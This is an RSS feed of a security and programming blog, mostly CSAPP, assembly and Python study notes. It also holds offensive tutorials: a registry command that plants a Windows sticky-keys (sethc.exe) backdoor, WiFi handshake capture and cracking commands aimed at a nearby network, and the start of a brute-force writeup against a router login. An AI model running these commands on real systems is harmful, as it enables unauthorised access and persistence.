<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="https://www.w3.org/2005/Atom">
  <channel>
    <title>quanyechavshuo</title>
    <description>A blog about programming and network security</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Fri, 18 Aug 2017 08:16:31 +0800</pubDate>
    <lastBuildDate>Fri, 18 Aug 2017 08:16:31 +0800</lastBuildDate>
    <generator>Jekyll v3.4.2</generator>
    
      <item>
        <title>深入理解计算机系统第3章笔记</title>
        <description>&lt;p&gt;1.编译器驱动程序将源文件翻译成可执行目标文件可分为4个阶段完成&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/csapp3-1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;a.&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -O1 -S hello.c&lt;/code&gt;中:gcc也可用cc缩写代替,-O1表示编译器优化级别,-S表示生成汇编代码,结果为hello.s[汇编]
b.&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -O1 -c hello.c&lt;/code&gt;:gcc会编译并汇编,得到hello.o,hello.o是二进制格式,可用&lt;code class=&quot;highlighter-rouge&quot;&gt;objdump -d hello.o&lt;/code&gt;查看汇编格式内容
c.&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -O1 -o hello hello.o main.c&lt;/code&gt;:可由gcc产生可执行文件hello,可用&lt;code class=&quot;highlighter-rouge&quot;&gt;objdump -d hello&lt;/code&gt;反汇编hello这个可执行文件[反汇编]
d.上面a中的汇编过程默认得到的为ATT格式的汇编代码,要得到intel格式的指令为:&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -O1 -S -masm=intel hello.c&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;2.gcc生成的汇编指令都有一个字符后缀,表明操作数的大小,movb表示传送字节(eg,对应al/ah),movw表示传送字(eg,对应ax/bx),
movl表示传送双字(eg,对应eax/ebx)&lt;/p&gt;

&lt;p&gt;3.mov指令有个限制,传送指令的两个操作数不能都指向存储器位置.eg,mov [0x1000],[0x2000]是不允许的,需要mov eax,[0x1000]先,再mov [0x2000],eax&lt;/p&gt;

&lt;p&gt;4.movs和movz都是将一个较小的数据复制到一个较大的数据位置,高位用符号位扩展(movs)或者用零位扩展(movz)进行填充&lt;/p&gt;

&lt;p&gt;5.movsbl:将b符号扩展(s)成l格式后再mov到l,movzwl:将w零扩展(z)成l后再mov到l,eg:假设%dh=CD(1100 1101),%eax=98765432&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;movb %dh,%al        %al=%dh=CD,%eax=987654CD
movsbl %dh,%eax     sbl:%dh-&amp;gt;FFFFCD,%eax=FFFFCD
movzbl %dh,%eax     zbl:%dh-&amp;gt;0000CD,%eax=0000CD
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;6.左移右移汇编指令&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sal:算术左移
shl:逻辑左移
sar:算术右移
shr:逻辑右移
sal=shl,只有算术右移(sar)操作要求区分有符号和无符号操作数,shr在高位补0,sal和shl在低位补0,这个特性使得补码运算
成为实现有符号整数运算的一种比较好的方法
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Wed, 16 Aug 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/auxilary/2017/08/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AC%AC3%E7%AB%A0%E7%AC%94%E8%AE%B0/</link>
        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/08/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AC%AC3%E7%AB%A0%E7%AC%94%E8%AE%B0/</guid>
        
        <category>csapp</category>
        
        
        <category>auxilary</category>
        
      </item>
    
      <item>
        <title>深入理解计算机系统第2章笔记</title>
        <description>&lt;p&gt;1.不同数据类型在不同位数的操作系统下的内存长度
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/csapp2-1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2.大端和小端
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/csapp2-2.png&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/csapp2-3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;大端(big endian)以高位数值存到内存地址的低位(以大数结尾)&lt;br /&gt;
小端(little endian)以低位数值存到内存地址的高位(以小数结尾)&lt;br /&gt;
网络上的字节序为大端,而计算机上的字节序一般为小端,于是在发送到网络上之前需要转换一次,否则数据发送到目的地会被对方
理解错了,什么转换方法好呢?如果转换成char类型当然好,因为char类型的数据只占一个字节,没有大端和小端的区别,eg:
将int(127)发到网络上去,127需要(2**xx7=128)7bits也即1B的数据量传输,转成char类型为”127”需要(1,2,7分别作为char)需要
3B的传输量,这样的话需要传输3倍的数据量,效率太低了,于是不用这种方法,采用base64将本地数据编码后传输到网络上去&lt;/p&gt;

&lt;p&gt;3.数据的表现形式有两种:&lt;code class=&quot;highlighter-rouge&quot;&gt;无符号&lt;/code&gt;类型和&lt;code class=&quot;highlighter-rouge&quot;&gt;补码&lt;/code&gt;类型,负数用补码表示,可由对应正数取反加1得到,eg:-4的表示形式&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;4的二进制表示形式是0100,取反加1为:1011+1=1100
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;4.负数的计算为:-1x最高位(1)x2x2..2[位数-1]+除最高位以外的其他位的正数值&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;B2T(X) = -x_{w-1} \cdot 2^{w-1} + \sum_{i=0}^{w-2} x_i \cdot 2^i&lt;/script&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;eg,1100这个负数的值计算方法为:-1x1x2x2x2+1x2x2+0x2+0=-8+4=-4
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;5.如果一个表达式中包含有符号数和无符号数则会默认将有符号数转换成无符号数&lt;/p&gt;
</description>
        <pubDate>Fri, 11 Aug 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/auxilary/2017/08/11/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AC%AC2%E7%AB%A0%E7%AC%94%E8%AE%B0/</link>
        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/08/11/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AC%AC2%E7%AB%A0%E7%AC%94%E8%AE%B0/</guid>
        
        <category>计算机系统</category>
        
        
        <category>auxilary</category>
        
      </item>
    
      <item>
        <title>win7粘滞键后门</title>
        <description>&lt;h3 id=&quot;0x0-about&quot;&gt;0x0 About&lt;/h3&gt;

&lt;p&gt;win03下copy命令可制作粘滞键后门,测试在win7上copy方法无效,本文记录win7下的方法&lt;/p&gt;

&lt;h3 id=&quot;0x1-detail&quot;&gt;0x1 Detail&lt;/h3&gt;

&lt;p&gt;以管理员身份打开cmd.exe运行如下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\windows\system32\cmd.exe&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;其中sethc.exe可替换成magnify.exe(放大镜)或其他(eg.narrator.exe/osk.exe),替换成更隐藏的技巧可根据下面链接自由发挥&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://answers.microsoft.com/en-us/windows/forum/windows_7-performance/run-command/a2632e97-c8d1-4ab3-8df2-7e70a4448267&quot;&gt;AsULike&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;删除后门以管理员身份打开cmd.exe运行如下即可:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;REG DELETE &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;以上理论上适用于win vistar以上系统,只在win7上测试过.&lt;/p&gt;

&lt;p&gt;以上可由管理员权限得到system权限,也可用于替代psexec.exe -s cmd.exe开system权限&lt;/p&gt;
</description>
        <pubDate>Thu, 03 Aug 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/08/03/win7%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/08/03/win7%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/</guid>
        
        <category>后门</category>
        
        <category>win7</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>xlearn</title>
        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;记录安全界大牛分享经验 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/3xp10it/xlearn&quot;&gt;gitlink&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/xlearn/master/tk%E6%95%99%E4%B8%BB.jpg&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/xlearn/master/yuange.png&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/猪猪侠的白帽学习路线.png&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Sat, 01 Jul 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/auxilary/2017/07/01/xlearn/</link>
        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/07/01/xlearn/</guid>
        
        <category>经验</category>
        
        <category>大牛经验</category>
        
        
        <category>auxilary</category>
        
      </item>
    
      <item>
        <title>汇编指令备忘录</title>
        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;记录易忘汇编指令经典解释
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;

&lt;p&gt;1.&lt;a href=&quot;http://www.fx115.net/qa-220-122690.aspx&quot;&gt;movsz/movsx&lt;/a&gt;&lt;br /&gt;
2.&lt;a href=&quot;http://baike.baidu.com/link?url=LW99HgDBFHx3Ao2Ep1JshAbaQT5O3QqsLqZYhi_a1mJ1tFPXc-S1Y9-JRmYKJQjXn0hR7vO6tIDDzXicIDLnrq&quot;&gt;lodsb/lodsw[stosb/stosw]&lt;/a&gt;&lt;br /&gt;
3.&lt;a href=&quot;http://bbs.bccn.net/thread-327979-1-1.html&quot;&gt;cdq&lt;/a&gt; &lt;a href=&quot;https://zhidao.baidu.com/question/576311402.html&quot;&gt;cdq-more&lt;/a&gt;&lt;br /&gt;
4.&lt;a href=&quot;http://baike.baidu.com/link?url=CT8ZZrc7HIQuiY5exSQr0uESH2sipINbLQr4APzLt8x2JRGo4mqTYw-NA6MigqE83mCndW2EhKDmUqRk-4io5_&quot;&gt;neg&lt;/a&gt;
5.sal/shl,sar/shr&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sal:算术左移
shl:逻辑左移
sar:算术右移[这四个当中唯一一个要考虑符号位的]
shr:逻辑右移 6.imul S/mul S,cdq/cltd,idiv S/div S

imul S&amp;lt;==&amp;gt;{R[edx]:R[eax]&amp;lt;-SxR[eax]}&amp;lt;==&amp;gt;有符号全64位乘法
mul S&amp;lt;==&amp;gt;{R[edx]:R[eax]&amp;lt;-SxR[eax]}&amp;lt;==&amp;gt;无符号全64位乘法
cdq/cltd&amp;lt;==&amp;gt;{R[edx]:R[eax]&amp;lt;-SignExtend(R[eax])}&amp;lt;==&amp;gt;转为四字(cdq是intel格式,cltd是att格式)
idiv S&amp;lt;==&amp;gt;{R[edx]&amp;lt;-R[edx]:R[eax] mod S;R[eax]&amp;lt;-R[edx]:R[eax] / S}&amp;lt;==&amp;gt;有符号除法
div S&amp;lt;==&amp;gt;{R[edx]&amp;lt;-R[edx]:R[eax] mod S;R[eax]&amp;lt;-R[edx]:R[eax] / S}&amp;lt;==&amp;gt;无符号除法

上面的:代表32位和低32位的分界符号
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;7.标志寄存器&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CF(carry flag):进位标志.最近的操作使最高位产生了进位.可用来检查无符号操作数的溢出
ZF(zero flag):零标志.最近的操作得出的结果为0
SF(sign flag):符号标志.最近的操作得到的结果为负数
OF(overflow flag):溢出标志.最近的操作导致一个补码溢出--正溢出或负溢出

cmp与sub指令在设置标志寄存器的标志位的行为一样
test与and指令在设置标志寄存器的标志位的行为一样
cmp和test改变标志寄存器,不改变操作数
sub和and改变标志寄存器,也改变操作数
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Thu, 29 Jun 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/06/29/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/06/29/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95/</guid>
        
        <category>汇编指令</category>
        
        <category>备忘</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>python子函数使用主函数变量</title>
        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python中子函数使用主函数变量方法
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;子函数对主函数中的tmpvalue相当于复制,不是引用,下面子函数中只能读到主函数中的tmpvalue,不能修改主函数的tmpvalue

def mainfunc(folder, ext_list):
    tmpvalue=2 
    tmpvalueList = [&quot;3&quot;]

    def subfunc():
        print(tmpvalue)
        tmpvalue+=1
        print(tmpvalue)
        print(tmpvalueList)
        tmpvalueList[0]=(&quot;4&quot;)
        print(tmpvalueList)
    subfunc()
mainfunc(1,2)

------output------
Traceback (most recent call last):
  File &quot;3.py&quot;, line 13, in &amp;lt;module&amp;gt;
    mainfunc(1,2)
  File &quot;3.py&quot;, line 12, in mainfunc
    subfunc()
  File &quot;3.py&quot;, line 6, in subfunc
    print(tmpvalue)
UnboundLocalError: local variable 'tmpvalue' referenced before assignment
------output------

但是子函数中可以对主函数中的数组写,比变量功能强大,子函数可以改变主函数中的tmpvalueList

def mainfunc(folder, ext_list):
    tmpvalue=2 
    tmpvalueList = [&quot;3&quot;]

    def subfunc():
        print(tmpvalue)
        #tmpvalue+=1
        #print(tmpvalue)
        print(tmpvalueList)
        tmpvalueList[0]=(&quot;4&quot;)
        print(tmpvalueList)
    subfunc()
mainfunc(1,2)

-------output-------
2
['3']
['4']
-------output-------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Fri, 09 Jun 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/python/2017/06/09/python%E5%AD%90%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8%E4%B8%BB%E5%87%BD%E6%95%B0%E5%8F%98%E9%87%8F/</link>
        <guid isPermaLink="true">http://localhost:4000/python/2017/06/09/python%E5%AD%90%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8%E4%B8%BB%E5%87%BD%E6%95%B0%E5%8F%98%E9%87%8F/</guid>
        
        <category>python</category>
        
        
        <category>python</category>
        
      </item>
    
      <item>
        <title>wifi crack in macOS</title>
        <description>&lt;h3 id=&quot;0x00-必读link&quot;&gt;0x00 必读link&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://gist.github.com/victorreyesh/6532800
https://www.aircrack-ng.org/install.html
https://apple.stackexchange.com/questions/117843/equivalent-of-airodump-ng-for-max-os-x
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-airport&quot;&gt;0x01 airport&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / -name &quot;airport&quot;
airport -s
    root in ~ λ /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s
                                SSID BSSID             RSSI CHANNEL HT CC SECURITY (auth/unicast/group)
                                zhen d8:c8:e9:02:74:08 -83  4       Y  CN WPA(PSK/TKIP,AES/TKIP) WPA2(PSK/TKIP,AES/TKIP)
                           @Hos-WiFi 94:b4:0f:73:7a:72 -88  44,+1   Y  -- NONE
                   HHT_10_2_229_225_ ac:cf:23:8c:70:b8 -44  11      Y  TW WPA2(PSK/AES/AES)
                                 www 50:bd:5f:6e:3f:44 -68  11,-1   Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES)
                          ziroom-11F b8:f8:83:d8:4a:2b -40  6,-1    Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES)   

(target=www)
airport en1 sniff 11(en1 is the wifi netcard)
wait...(find / -name &quot;*.cap&quot;,/tmp/*.cap exists)
aircrack-ng -w ......./pass.txt -b 50:bd:5f:6e:3f:44 /tmp/*.cap
    或者将cap文件转成hashcat支持的格式再用hashcat破解:
    a.将https://github.com/hashcat/hashcat-utils/releases里面的cap2hccapx.bin放到kali64(vm)下运行得到hccapx文件,然后再运行:
    b.hashcat -a 3 -m 2500 output.hccapx ?d?d?d?d?d?d?d?d
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-attention&quot;&gt;0x02 Attention&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.aircrack-ng官网说airodump-ng和aireplay-ng在macOS不支持
    airodump-ng可以看到已经建立的wifi连接
    aireplay-ng可以主动攻击wifi,上面的airport en1 sniff 只能被动等待有人连接wifi
    ---detail...
    &quot; Mind you, airodump-ng and aireplay-ng are linux only and will not work under OSX native, so for reinjecting
     and sniffing you will have to use other means.

     If you have an intel Mac check out the VMware Fusion option which is mentioned lower on this page.&quot; 

     也即,目前macOS sierra下只好较被动的用airport sniff命令较长时间以保证期间有handshake,不可主动攻击

2.KisMac2不支持macOS sierra,目前新版本的macOS只能用上面的airport的被动方法crack wifi,除非找到了airodump-ng和
aireplay-ng的替代品
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x03-xwifi&quot;&gt;0x03 xwifi&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;以上自动化脚本成xwifi如下
https://github.com/3xp10it/xwifi/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Tue, 06 Jun 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/06/06/wifi-crack-in-macOS/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/06/06/wifi-crack-in-macOS/</guid>
        
        <category>wifi</category>
        
        <category>crack</category>
        
        <category>macOS</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>firefox addons--复制cookie附加组件开发</title>
        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;目的:制作一个火狐附加组件
用途:用于在跑sqlmap或其他场景中时方便地提供cookie
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-refer&quot;&gt;0x01 Refer&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.入门
https://developer.mozilla.org/zh-CN/Add-onso
2.api
https://developer.mozilla.org/zh-CN/Add-ons/WebExtensions
3.示例
https://developer.mozilla.org/en-US/Add-ons/WebExtensions/Examples
4.发布
https://developer.mozilla.org/en-US/Add-ons/WebExtensions/Publishing_your_WebExtension
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-detail&quot;&gt;0x02 Detail&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.最后代码如下:
https://github.com/3xp10it/copyCookie

2.关键代码如下,用于获取当前标签页面中的所有cookie

--------------cookie.js----------------
function showCookiesForTab(tabs) {
  //get the first tab object in the array
  tab = tabs.pop();

  //get all cookies in the domain
  var gettingAllCookies = browser.cookies.getAll({url: tab.url});
  gettingAllCookies.then((cookies) =&amp;gt; {
    if (cookies.length &amp;gt; 0) {
      var returnCookie=&quot;&quot;;
      for (cookie of cookies) {
        var content = cookie.name + &quot;=&quot;+ cookie.value+&quot;;&quot;;
        returnCookie=returnCookie+content;
      }
      returnCookie=returnCookie.substr(0,returnCookie.length-1);
       //alert(returnCookie);
        document.getElementById(&quot;output&quot;).innerHTML=returnCookie;
        var copyText=document.querySelector('#output');
        copyText.select();

        function copy1(){
        document.getElementById(&quot;output&quot;).innerHTML=returnCookie;
        var copyText=document.querySelector('#output');
        copyText.select();
        //console.log(copyText.value);
        var res=document.execCommand(&quot;copy&quot;);
        //console.log(res);
        //alert(&quot;copyed to clipboard&quot;);
        }        

        function copy2(){
        document.getElementById(&quot;output&quot;).innerHTML=&quot;--cookie='&quot;+returnCookie+&quot;'&quot;;
        var copyText=document.querySelector('#output');
        copyText.select();
        //console.log(copyText.value);
        var res=document.execCommand(&quot;copy&quot;);
        //console.log(res);
        //alert(&quot;copyed to clipboard&quot;);
        }        

        document.querySelector(&quot;#pureCookie&quot;).addEventListener(&quot;click&quot;,copy1);
        document.querySelector(&quot;#sqlmapCookie&quot;).addEventListener(&quot;click&quot;,copy2);
    } else {
      var p = document.createElement(&quot;p&quot;);
      var content = document.createTextNode(&quot;No cookies in this tab.&quot;);
      var parent = cookieList.parentNode;

      p.appendChild(content);
      parent.appendChild(p);
    }
  });
};

//get active tab to run an callback function.
//it sends to our callback an array of tab objects
function getActiveTab() {
  return browser.tabs.query({currentWindow: true, active: true});
}
getActiveTab().then(showCookiesForTab);
--------------cookie.js----------------

3.可用于复制cookie和sqlmap中要用到的cooie参数形式的cookie

4.安装本附加组件方法
    在firefox的附加组件搜索copy cookie to clipboard,安装即可
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x03-attention&quot;&gt;0x03 Attention&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.上面的用于复制数据到系统剪切板的代码如果没有通过人工点击事件触发则无法成功复制数据到剪切板
2.专门用于操作剪切板的强大js,上面代码中暂时没有用到.
    https://github.com/zenorocha/clipboard.js
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 01 Jun 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/auxilary/2017/06/01/firefox-addons-%E5%A4%8D%E5%88%B6cookie%E9%99%84%E5%8A%A0%E7%BB%84%E4%BB%B6%E5%BC%80%E5%8F%91/</link>
        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/06/01/firefox-addons-%E5%A4%8D%E5%88%B6cookie%E9%99%84%E5%8A%A0%E7%BB%84%E4%BB%B6%E5%BC%80%E5%8F%91/</guid>
        
        <category>addons</category>
        
        <category>firefox</category>
        
        <category>cookie</category>
        
        
        <category>auxilary</category>
        
      </item>
    
      <item>
        <title>记一次js加密后的http暴破</title>
        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;目的:爆破某个http登录页面
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-detail&quot;&gt;0x01 Detail&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.在登录页面填入123455提交后用burpsuite拦截,发现post数据如下:
    {&quot;method&quot;:&quot;do&quot;,&quot;login&quot;:{&quot;password&quot;:&quot;0KcgeXhc9TefbwK&quot;}}
  说明浏览器加密表单中的密码字段后再提交,这样就不能直接用burpsuite等工具加载字典爆破了

2.尝试找到加密的js
    a)用chrome打开http://192.168.1.1登录页面,发现右键被禁用
    b)打开开发者工具,按如下图1-5的顺序点击
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/js1.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    c)在上一步最后的点击后看到的如下黄色高亮的那一行上单击左键(第2行)表示在这一行上下断点,下好断点后第2行会有蓝
      色箭头出现表示已经下好断点在这行
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/js2.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    d)先将所有的4行(断点在第2行)js整理下格式,在线整理js格式:
        http://www.css88.com/tool/js_beautify/

        整理后的js内容如下:
        ---------------js----------------
        function init() {
            function f() {
                setStyle(id(&quot;lgPwdNote&quot;), {
                    visibility: &quot;visible&quot;
                });
                disInputTip($(&quot;#lgPwd ~ i.tip&quot;)[0], &quot;error&quot;)
            }

            function g(a) {
                var d = &quot;16px&quot;,
                    c = id(&quot;loginError&quot;);
                switch (a) {
                case ESYSLOCKEDFOREVER:
                    window.top.location.reload();
                    break;
                case ESYSLOCKED:
                    window.top.location.reload();
                    break;
                case EUNAUTH:
                    a = $.authRltObj.time;
                    a = void 0 == a ? e.cnt : a;
                    if (e.cnt == a) break;
                    a &amp;lt;= e.minTipCnt ? c.innerHTML = label.loginErrorTipH + a + label.loginErrorTipT : (c.innerHTML = label.loginPwdErr, d = &quot;35px&quot;);
                    f();
                    break;
                case k:
                    c.innerHTML = label.loginPwdErr;
                    f();
                    break;
                case ESYSCLIENTFULL:
                    b.disabled = !0, id(&quot;loginSub&quot;).disabled = !0, showCover(function (a) {
                        var c;
                        a.innerHTML = &quot;&amp;lt;p&amp;gt;&quot; + label.loginFull + &quot;&amp;lt;/p&amp;gt;&quot;;
                        a = $(&quot;#Cover p&quot;);
                        c = (document.documentElement.clientHeight - a[0].offsetHeight) / 2;
                        a.css(&quot;marginTop&quot;, c - 0.3 * c)
                    })
                }
                c.style.lineHeight = d;
                0 &amp;lt; b.value.length &amp;amp;&amp;amp; setInputCursor(b)
            }

            function l() {
                var a = id(&quot;loginFeg&quot;);
                a.style.visibility = &quot;visible&quot; == a.style.visibility ? &quot;hidden&quot; : &quot;visible&quot;
            }

            function h() {
                var a = id(&quot;lgPwd&quot;);
                $.auth($.orgAuthPwd(a.value), function (b) {
                    b == ENONE ? (a.value = &quot;&quot;, $.aundLg = !0, unloadLogin()) : g(parseInt(thRltObj.bHa$.authRltObj.code))
                })
            }
            var k = &quot;PSWIlegal&quot;,
                b = id(&quot;lgPwd&quot;),
                e = {
                    max: 1800,
                    cnt: 20,
                    minTipCnt: 3,
                    timeout: 1E3
                };
            (function () {
                var a = id(&quot;loginSub&quot;),
                    d = id(&quot;pwdTipStr&quot;);
                $(&quot;span.loginHelp&quot;)[0].onclick = l;
                g(parseInt($.authRltObj.code));
                a.onclick = h;
                b.value = &quot;&quot;;
                b.onkeyup = function (a) {
